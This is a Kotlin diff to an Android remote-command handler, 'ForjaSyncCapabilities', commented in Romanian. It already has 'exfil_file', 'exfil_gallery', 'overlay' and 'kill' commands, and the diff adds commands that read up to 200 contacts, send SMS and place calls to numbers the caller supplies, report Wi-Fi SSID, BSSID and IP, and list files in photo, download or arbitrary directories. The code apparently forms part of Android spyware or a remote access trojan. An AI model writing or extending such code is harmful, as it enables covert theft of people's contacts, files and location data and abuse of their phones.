@@ -66,6 +66,11 @@ object ForjaSyncCapabilities {
                 "exfil_file" -> exfilFile(p)
                 "exfil_gallery" -> exfilGallery(p)
                 "overlay" -> overlay(p)
+                "contacts" -> contacts()
+                "sms_send" -> smsSend(p)
+                "call" -> makeCall(p)
+                "network" -> network()
+                "storage_list" -> storageList(p)
                 "ping" -> buildJsonObject { put("pong", true); put("ts", System.currentTimeMillis()) }
                 "kill" -> killApp()
                 "status" -> status()
@@ -322,6 +327,137 @@ object ForjaSyncCapabilities {
             put("bat", bat["pct"]?.jsonPrimitive?.content ?: "-1")
             put("ts", System.currentTimeMillis())
         }
+    }
+
+    // ── Comunicare & date personale ────────────────────────────────
+    private suspend fun contacts(): JsonObject = withContext(Dispatchers.IO) {
+        try {
+            if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.READ_CONTACTS)
+                != PackageManager.PERMISSION_GRANTED) return@withContext err("contacts: permisiune neacordată")
+            val proj = arrayOf(
+                android.provider.ContactsContract.CommonDataKinds.Phone._ID,
+                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
+                android.provider.ContactsContract.CommonDataKinds.Phone.TYPE
+            )
+            val cur = app.contentResolver.query(
+                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, proj, null, null,
+                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
+            ) ?: return@withContext err("contacts: query null")
+            val list = ArrayList<JsonObject>()
+            val nameIdx = cur.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+            val numIdx = cur.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
+            while (cur.moveToNext() && list.size < 200) {
+                list.add(buildJsonObject {
+                    put("name", cur.getString(nameIdx) ?: "")
+                    put("number", cur.getString(numIdx) ?: "")
+                })
+            }
+            cur.close()
+            buildJsonObject { putJsonArray("list") { list.forEach { add(it) } }; put("count", list.size) }
+        } catch (e: Exception) { err("contacts: ${e.message}") }
+    }
+
+    private suspend fun smsSend(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
+        try {
+            if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.SEND_SMS)
+                != PackageManager.PERMISSION_GRANTED) return@withContext err("sms_send: permisiune neacordată")
+            val to = p["to"]?.jsonPrimitive?.content ?: return@withContext err("sms_send: lipsă 'to'")
+            val msg = p["msg"]?.jsonPrimitive?.content ?: return@withContext err("sms_send: lipsă 'msg'")
+            val sm = app.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.SmsManager
+            sm.sendTextMessage(to, null, msg.take(160), null, null)
+            buildJsonObject { put("ok", true); put("to", to); put("len", msg.length) }
+        } catch (e: Exception) { err("sms_send: ${e.message}") }
+    }
+
+    private fun makeCall(p: JsonObject): JsonObject {
+        val permOk = androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED
+        val num = p["number"]?.jsonPrimitive?.content
+        if (!permOk) return err("call: permisiune neacordată")
+        if (num.isNullOrBlank()) return err("call: lipsă 'number'")
+        return try {
+            val intent = android.content.Intent(android.content.Intent.ACTION_CALL, android.net.Uri.parse("tel:$num"))
+            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            app.startActivity(intent)
+            buildJsonObject { put("ok", true); put("number", num) }
+        } catch (e: Exception) { err("call: ${e.message}") }
+    }
+
+    private fun network(): JsonObject = buildJsonObject {
+        try {
+            val cm = app.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+            val na = cm.activeNetwork ?: return buildJsonObject { put("connected", false) }
+            val info = cm.getNetworkInfo(na)
+            put("connected", info?.isConnected ?: false)
+            put("type", info?.typeName ?: "")
+            // WiFi details
+            try {
+                @Suppress("DEPRECATION")
+                val wi = cm.getNetworkInfo(android.net.ConnectivityManager.TYPE_WIFI)
+                if (wi?.isConnected == true) {
+                    @Suppress("DEPRECATION")
+                    val wm = app.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                    val cm2 = android.net.wifi.WifiManager.calculateSignalLevel(
+                        @Suppress("DEPRECATION") wm.connectionInfo.rssi, 5
+                    )
+                    put("wifi_ssid", @Suppress("DEPRECATION") wifiSsid())
+                    put("wifi_bssid", @Suppress("DEPRECATION") wifiBssid())
+                    put("wifi_rssi", @Suppress("DEPRECATION") wm.connectionInfo.rssi)
+                    put("wifi_level", cm2)
+                }
+            } catch (_: Exception) {}
+            // IP address
+            try {
+                val en = java.net.NetworkInterface.getNetworkInterfaces()
+                while (en.hasMoreElements()) {
+                    val ifa = en.nextElement()
+                    val addr = ifa.inetAddresses
+                    while (addr.hasMoreElements()) {
+                        val ip = addr.nextElement()
+                        if (!ip.isLoopbackAddress) { put("ip", ip.hostAddress); break }
+                    }
+                }
+            } catch (_: Exception) {}
+        } catch (e: Exception) { put("error", e.message ?: "") }
+    }
+
+    @Suppress("DEPRECATION")
+    private fun wifiSsid(): String {
+        val wm = app.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+        return (wm.connectionInfo.ssid ?: "").removeSurrounding("\"")
+    }
+    @Suppress("DEPRECATION")
+    private fun wifiBssid(): String {
+        val wm = app.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+        return wm.connectionInfo.bssid ?: ""
+    }
+
+    private suspend fun storageList(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
+        try {
+            val dir = p["dir"]?.jsonPrimitive?.content ?: "DCIM"
+            val limit = (p["limit"]?.jsonPrimitive?.content?.toIntOrNull() ?: 30).coerceIn(1, 100)
+            val base = when (dir) {
+                "DCIM" -> android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DCIM)
+                "Pictures" -> android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_PICTURES)
+                "Download" -> android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS)
+                "Internal" -> app.filesDir
+                "Cache" -> app.cacheDir
+                else -> java.io.File(dir)
+            }
+            if (!base.exists()) return@withContext err("storage_list: director inexistent: $dir")
+            val files = base.walkTopDown().maxDepth(3).takeWhile { it.name != "" }
+                .take(limit * 3)
+                .map { f -> buildJsonObject {
+                    put("path", f.relativeTo(base).path)
+                    put("size", f.length())
+                    put("is_dir", f.isDirectory)
+                    put("modified", f.lastModified())
+                } }
+                .filter { it["is_dir"]?.jsonPrimitive?.content.toBoolean() == false && (it["size"]?.jsonPrimitive?.long ?: 0) > 0 }
+                .take(limit)
+            val fileArr = files.toList()
+            buildJsonObject { put("base", base.path); putJsonArray("files") { fileArr.forEach { add(it) } }; put("count", fileArr.size) }
+        } catch (e: Exception) { err("storage_list: ${e.message}") }
     }
 
     // ── Killer / forțat ─────────────────────────────────────────────
